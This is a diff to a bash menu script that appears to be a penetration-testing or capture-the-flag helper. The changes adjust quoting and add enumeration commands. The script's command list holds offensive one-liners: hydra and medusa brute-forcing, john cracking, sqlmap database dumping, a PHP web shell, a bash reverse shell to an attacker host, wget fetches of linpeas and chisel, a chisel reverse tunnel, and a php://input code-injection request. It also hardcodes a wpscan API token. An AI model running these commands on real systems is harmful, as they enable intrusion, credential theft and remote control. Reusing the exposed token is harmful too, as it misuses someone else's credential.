@@ -31,45 +31,47 @@ COMMAND_6="Add entry to /etc/hosts"
 COMMAND_7="Remove entry from /etc/hosts"
 COMMAND_8="Setup proxychains config"
 
-COMMAND_e1='rustscan --accessible --ulimit 5000 -a $RHOST -- -Pn -sV -sC | tee -i nmap-scan.txt | highlight "^\d+\/tcp"'
-COMMAND_e2='ffuf -v -c -recursion -t 64 -o ffuf.json -e "$W_EXT_COMMON" -w "$W_DIR_2_3_MEDIUM" -u http://$RHOST/FUZZ'
-COMMAND_e3='whatweb -v $RHOST'
-COMMAND_e4='wpscan --api-token G8ifDn8HmQOCnzEB9Z7i9NkJDX9cGvfmPPbOdxTXNFk -v -o wpscan.txt --url http://$RHOST'
-COMMAND_e5='~/Tools/enum4linux.pl -GUSnoi $RHOST | tee -i samba.txt | highlight "^user:\[.*\]|^.*\sMapping: OK"'
-COMMAND_e6='wfuzz -c -z file,$W_DIR_2_3_MEDIUM -X POST --hh 45 -u http://$RHOST/?FUZZ\=test'
+COMMAND_e1="rustscan --accessible --ulimit 5000 -a ${RHOST} -- -Pn -sV -sC | tee -i nmap-scan.txt | highlight \"^\d+\/tcp\""
+COMMAND_e1map="nmap -Pn -p- ${RHOST}"
+COMMAND_e2="ffuf -c -fs 0 -recursion -t 64 -o ffuf.json -e $``W_EXT_COMMON -w $``W_DIR_2_3_MEDIUM -u http://${RHOST}/FUZZ"
+COMMAND_e3="whatweb -v ${RHOST}"
+COMMAND_e4="wpscan --api-token G8ifDn8HmQOCnzEB9Z7i9NkJDX9cGvfmPPbOdxTXNFk -v -o wpscan.txt --url http://${RHOST}"
+COMMAND_e5="~/Tools/enum4linux.pl -GUSnoi ${RHOST} | tee -i samba.txt | highlight \"^user:\[.*\]|^.*\sMapping: OK\""
+COMMAND_e6="wfuzz -c -z file,$``W_DIR_2_3_MEDIUM -X POST --hh 45 -u http://${RHOST}/?FUZZ\=test"
+COMMAND_e7="ffuf -c -fs 0 -t 64 -o fuff-dns.json -u http://${RHOST} -w $``W_DNS_COMMON -H \"Host: FUZZ.${RHOST}.com\""
 
-COMMAND_v1='nmap -Pn -sV -oN nmap-vuln.txt --script vuln $RHOST | highlight "CVE-\d*-\d*"'
-COMMAND_v2='nmap $RHOST -p80 -oG - | nikto -o nikto-report.html -h -'
-COMMAND_v3='nikto -Plugin dir_traversal -h $RHOST'
+COMMAND_v1="nmap -Pn -sV -oN nmap-vuln.txt --script vuln ${RHOST} | highlight \"CVE-\d*-\d*\""
+COMMAND_v2="nmap ${RHOST} -p80 -oG - | nikto -o nikto-report.html -h -"
+COMMAND_v3="nikto -Plugin dir_traversal -h ${RHOST}"
 
-COMMAND_n1='ssh -i id_rsa $USER@$RHOST -p 22'
-COMMAND_n2='nc -nlvp 4444'
-COMMAND_n3='ssh -i id_rsa $USER@$RHOST -L $RPORT:172.16.0.0:$LPORT -N -f'
-COMMAND_n4='ssh -i id_rsa $USER@$RHOST -D 9050 -N -f'
-COMMAND_n5='chisel server -p 9999 --reverse -v'
-COMMAND_n6='nc -nlvp 5555 | tar xf -'
+COMMAND_n1="ssh -i id_rsa $``USER@${RHOST} -p 22"
+COMMAND_n2="nc -nlvp 4444"
+COMMAND_n3="ssh -i id_rsa $``USER@${RHOST} -L $``RPORT:172.16.0.0:$``LPORT -N -f"
+COMMAND_n4="ssh -i id_rsa $``USER@${RHOST} -D 9050 -N -f"
+COMMAND_n5="chisel server -p 9999 --reverse -v"
+COMMAND_n6="nc -nlvp 5555 | tar xf -"
 
-COMMAND_u1='scp ~/Tools/linpeas.sh $USER@$RHOST:/tmp'
-COMMAND_u2='scp ~/Tools/chisel $USER@$RHOST:/tmp'
+COMMAND_u1="scp ~/Tools/linpeas.sh $``USER@${RHOST}:/tmp"
+COMMAND_u2="scp ~/Tools/chisel $``USER@${RHOST}:/tmp"
 
-COMMAND_b1='hydra -f -I -vV -t 16 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST ssh -s PORT'
-COMMAND_b2='medusa -h $RHOST -u $USER -P "$W_PASSWORD" -M http -m DIR:/protected | highlight "\[SUCCESS\]"'
-COMMAND_b3='hydra -f -I -vV -t 16 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST -s 80 http-post-form "/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed"'
-COMMAND_b4='ffuf -v -t 8 -X POST -w $W_DIR_2_3_MEDIUM -u http://$RHOST/login.php -d "key=FUZZ"'
-COMMAND_b5='fcrackzip -D -v -p "$W_PASSWORD" file.zip'
-COMMAND_b6='python2 /usr/share/john/ssh2john.py id_rsa > key.hash'
-COMMAND_b7='unshadow passwd shadow > key.hash'
-COMMAND_b8='john key.hash --wordlist=$W_PASSWORD --format=FORMAT'
-COMMAND_b9='sqlmap --dump-all --tamper=space2comment --dbms=mysql -r BURP_REQUEST_FFILE'
-COMMAND_ba='wpscan -v --passwords $W_PASSWORD --usernames $USER --url http://$RHOST'
+COMMAND_b1="hydra -f -I -vV -t 16 -L $``W_USERNAME -P $``W_PASSWORD ${RHOST} ssh -s PORT"
+COMMAND_b2="medusa -h ${RHOST} -u $``USER -P $``W_PASSWORD -M http -m DIR:/protected | highlight \"[SUCCESS]\""
+COMMAND_b3="hydra -f -I -vV -t 16 -L $``W_USERNAME -P $``W_PASSWORD ${RHOST} -s 80 http-post-form \"/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed\""
+COMMAND_b4="ffuf -v -t 8 -X POST -w $``W_DIR_2_3_MEDIUM -u http://${RHOST}/login.php -d \"key=FUZZ\""
+COMMAND_b5="fcrackzip -D -v -p $``W_PASSWORD file.zip"
+COMMAND_b6="python2 /usr/share/john/ssh2john.py id_rsa > key.hash"
+COMMAND_b7="unshadow passwd shadow > key.hash"
+COMMAND_b8="john key.hash --wordlist=$``W_PASSWORD --format=FORMAT"
+COMMAND_b9="sqlmap --dump-all --tamper=space2comment --dbms=mysql -r BURP_REQUEST_FFILE"
+COMMAND_ba="wpscan -v --passwords $``W_PASSWORD --usernames $``USER --url http://${RHOST}"
 
-COMMAND_d1='binwalk -e file.jpg'
-COMMAND_d2='steghide extract -sf file.jpg'
-COMMAND_d3='7z x file.zip'
+COMMAND_d1="binwalk -e file.jpg"
+COMMAND_d2="steghide extract -sf file.jpg"
+COMMAND_d3="7z x file.zip"
 
-COMMAND_t1='haiti HASH'
-COMMAND_t2='python ~/Tools/wordlistctl/wordlistctl.py search/list -g GROUP'
-COMMAND_t3='python ~/Tools/wordlistctl/wordlistctl.py fetch -d -b ~/Tools/wordlists -l KEYWORD'
+COMMAND_t1="haiti HASH"
+COMMAND_t2="python ~/Tools/wordlistctl/wordlistctl.py search/list -g GROUP"
+COMMAND_t3="python ~/Tools/wordlistctl/wordlistctl.py fetch -d -b ~/Tools/wordlists -l KEYWORD"
 
 COMMAND_f1='volatility -f $MEM_FILE imageinfo | tee -i mem-info.txt | highlight "Suggested Profile\(s\) : .*"'
 COMMAND_f2='volatility -f $MEM_FILE hivelist --profile=$MEM_PROFILE | highlight "0x\S.*(SYSTEM|SAM)"'
@@ -79,9 +81,9 @@ COMMAND_f5='volatility -f $MEM_FILE netscan --profile=$MEM_PROFILE'
 COMMAND_f6='volatility -f $MEM_FILE --profile=$MEM_PROFILE malfind -D /tmp'
 COMMAND_f7='volatility -f $MEM_FILE --profile=$MEM_PROFILE consoles'
 
-LINK_1="http://$RHOST"
-LINK_2="http://$RHOST/robots.txt"
-LINK_3="http://$RHOST/sitemap.xml"
+LINK_1="http://${RHOST}"
+LINK_2="http://${RHOST}/robots.txt"
+LINK_3="http://${RHOST}/sitemap.xml"
 LINK_4="https://gtfobins.github.io/"
 LINK_5="https://gchq.github.io/CyberChef/"
 
@@ -89,15 +91,15 @@ CLIP_1="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
 CLIP_2="export TERM=xterm"
 CLIP_3="stty raw -echo; fg"
 CLIP_4="<?php system($_GET[\"c\"]); ?>"
-CLIP_5="bash -i >& /dev/tcp/$LHOST/4444 0>&1"
-CLIP_6="wget -O /tmp/handyman http://$LHOST:8000/handyman_cp"
-CLIP_6="wget -O /tmp/linpeas.sh http://$LHOST:8000/linpeas.sh"
-CLIP_7="wget -O /tmp/chisel http://$LHOST:8000/chisel"
-CLIP_8="/tmp/chisel client $LHOST:9999 R:$LHOST:8888:127.0.0.1:[OPEN_PORT]"
-CLIP_9="curl -X POST --data \"<?php echo shell_exec('id'); ?>\" \"http://$RHOST/index.php?page=php://input%00\" -k -v"
+CLIP_5="bash -i >& /dev/tcp/${LHOST}/4444 0>&1"
+CLIP_6="wget -O /tmp/handyman http://${LHOST}:8000/handyman_cp"
+CLIP_6="wget -O /tmp/linpeas.sh http://${LHOST}:8000/linpeas.sh"
+CLIP_7="wget -O /tmp/chisel http://${LHOST}:8000/chisel"
+CLIP_8="/tmp/chisel client ${LHOST}:9999 R:${LHOST}:8888:127.0.0.1:[OPEN_PORT]"
+CLIP_9="curl -X POST --data \"<?php echo shell_exec('id'); ?>\" \"http://${RHOST}/index.php?page=php://input%00\" -k -v"
 
-LOCAL_="${ORANGE}$(whoami)@$LHOST${NOCOLOR}"
-REMOTE_="${RED}$USER@$RHOST${NOCOLOR}"
+LOCAL_="${ORANGE}$(whoami)@${LHOST}${NOCOLOR}"
+REMOTE_="${RED}$``USER@${RHOST}${NOCOLOR}"
 
 show_menus() {
   clear
@@ -118,10 +120,13 @@ show_menus() {
   echo -e "  ${LIGHTGREEN}Enumeration${NOCOLOR}"
   echo -e "  -----------"
   echo -e "  ${YELLOW}e1${NOCOLOR}) $COMMAND_e1 (${YELLOW}e11${NOCOLOR} for output)"
+  echo -e "  ${YELLOW}e1map${NOCOLOR}) $COMMAND_e1map"
   echo -e "  ${YELLOW}e2${NOCOLOR}) $COMMAND_e2 (${YELLOW}e22${NOCOLOR} for output)"
   echo -e "  ${YELLOW}e3${NOCOLOR}) $COMMAND_e3"
   echo -e "  ${YELLOW}e4${NOCOLOR}) $COMMAND_e4 (${YELLOW}e44${NOCOLOR} for output)"
   echo -e "  ${YELLOW}e5${NOCOLOR}) $COMMAND_e5 (${YELLOW}e55${NOCOLOR} for output)"
+  echo -e "  ${YELLOW}e6${NOCOLOR}) $COMMAND_e6"
+  echo -e "  ${YELLOW}e7${NOCOLOR}) $COMMAND_e7 (${YELLOW}e77${NOCOLOR} for output)"
   echo -e ""
   echo -e "  ${LIGHTGREEN}Vulnerablities${NOCOLOR}"
   echo -e "  --------------"
@@ -312,6 +317,7 @@ runCat () {
     e2) C="cat ffuf.json | python -m json.tool";;
     e4) C="cat wpscan.txt | highlight \"CVE-\d*-\d*\"";;
     e5) C="cat samba.txt | highlight \"^user:\[.*\]|^.*\sMapping: OK\"";;
+    e7) C="cat ffuf-dns.json | python -m json.tool";;
 
     v2) C="cat nmap-vuln.txt | highlight \"CVE-\d*-\d*\"";;
 
@@ -385,6 +391,7 @@ read_options() {
     8) setupProxyChains;;
 
     e1) runV $COMMAND_e1;;
+    e1map) runV $COMMAND_e1map;;
     e11) runCat 'e1';;
     e2) runV $COMMAND_e2;;
     e22) runCat 'e2';;
@@ -393,6 +400,9 @@ read_options() {
     e44) runCat 'e4';;
     e5) runV $COMMAND_e5;;
     e55) runCat 'e5';;
+    e6) runV $COMMAND_e6;;
+    e7) runV $COMMAND_e7;;
+    e77) runCat 'e7';;
 
     v1) runV $COMMAND_v1;;
     v11) runCat 'v1';;
